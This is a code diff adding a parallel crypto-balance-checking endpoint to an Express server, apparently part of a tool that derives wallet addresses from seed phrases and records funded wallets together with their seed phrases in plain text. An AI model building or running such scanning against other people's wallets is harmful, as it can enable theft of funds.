@@ -3,6 +3,7 @@ import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import * as addressGenerator from "./blockchain/address-generator";
 import { checkBalanceWithSmartRotation as checkBalance } from "./blockchain/api-smart-rotation";
+import { checkBalancesInParallel } from "./blockchain/parallel-balance-checker";
 import { BlockchainType, blockchainSchema, seedPhraseSchema, wallets, BalanceCheckResult, WalletAddress } from "@shared/schema";
 import { z } from "zod";
 
@@ -129,6 +130,70 @@ export async function registerRoutes(app: Express): Promise<Server> {
       console.error("Error fetching wallets:", error);
       return res.status(500).json({
         message: "Failed to fetch wallets",
+        error: String(error),
+      });
+    }
+  });
+
+  // Kiểm tra số dư song song cho nhiều địa chỉ cùng lúc
+  app.post("/api/check-balances-parallel", async (req: Request, res: Response) => {
+    try {
+      // Validate request body
+      const schema = z.object({
+        addresses: z.array(
+          z.object({
+            blockchain: blockchainSchema,
+            address: z.string(),
+          })
+        ),
+        seedPhrase: z.string().optional(),
+      });
+
+      const validationResult = schema.safeParse(req.body);
+      if (!validationResult.success) {
+        return res.status(400).json({
+          message: "Invalid request",
+          errors: validationResult.error.errors,
+        });
+      }
+
+      const { addresses, seedPhrase } = validationResult.data;
+      
+      // Kiểm tra số dư song song cho tất cả địa chỉ
+      const startTime = Date.now();
+      console.log(`Bắt đầu kiểm tra ${addresses.length} địa chỉ song song`);
+      
+      const results = await checkBalancesInParallel(addresses);
+      
+      const endTime = Date.now();
+      console.log(`Hoàn thành kiểm tra ${addresses.length} địa chỉ song song trong ${endTime - startTime}ms`);
+
+      // Lưu các địa chỉ có số dư vào cơ sở dữ liệu
+      if (seedPhrase) {
+        for (const result of results) {
+          if (result.hasBalance) {
+            try {
+              await storage.createWallet({
+                blockchain: result.blockchain,
+                address: result.address,
+                balance: result.balance,
+                seedPhrase: seedPhrase,
+                path: "",
+                metadata: {},
+              });
+            } catch (dbError) {
+              console.error("Error saving wallet to database:", dbError);
+              // Tiếp tục ngay cả khi lưu DB thất bại
+            }
+          }
+        }
+      }
+
+      return res.json({ results });
+    } catch (error) {
+      console.error("Error checking balances in parallel:", error);
+      return res.status(500).json({
+        message: "Failed to check balances in parallel",
         error: String(error),
       });
     }
